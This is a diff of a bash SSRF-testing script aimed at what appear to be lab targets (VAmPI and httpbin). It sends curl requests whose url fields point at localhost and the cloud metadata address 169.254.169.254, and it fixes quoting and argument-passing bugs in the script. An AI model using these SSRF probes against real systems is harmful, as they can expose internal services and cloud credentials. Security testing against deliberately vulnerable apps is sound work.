@@ -16,10 +16,10 @@ send_ssrf() {
   local method="$1"
   local url="$2"
   local label="$3"
-  local extra_args="${4:-}"
+  shift 3
 
   code=$(curl -sk -o /dev/null -w "%{http_code}" \
-    -X "${method}" ${extra_args} \
+    -X "${method}" "$@" \
     "${url}" \
     --max-time 10) || code="ERR"
   echo "    ${label} -> HTTP ${code}"
@@ -39,7 +39,7 @@ INTERNAL_TARGETS=(
 )
 
 for ssrf_url in "${INTERNAL_TARGETS[@]}"; do
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${ssrf_url}'))")
+  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${ssrf_url}")
   send_ssrf "GET" "${BASE}/httpbin/get?url=${encoded}" "httpbin ?url=${ssrf_url}"
 done
 
@@ -54,7 +54,7 @@ METADATA_TARGETS=(
 )
 
 for ssrf_url in "${METADATA_TARGETS[@]}"; do
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${ssrf_url}'))")
+  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${ssrf_url}")
   send_ssrf "GET" "${BASE}/httpbin/get?url=${encoded}" "httpbin ?url=${ssrf_url}"
 done
 
@@ -64,11 +64,11 @@ echo ""
 echo "[+] VAmPI SSRF via JSON body fields"
 send_ssrf "POST" "${BASE}/vampi/users/v1/_debug" \
   "vampi/_debug (localhost)" \
-  "-H 'Content-Type: application/json' -d '{\"url\":\"http://127.0.0.1/\"}'"
+  -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1/"}'
 
 send_ssrf "POST" "${BASE}/vampi/users/v1/_debug" \
   "vampi/_debug (metadata)" \
-  "-H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'"
+  -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
 
 echo ""
 
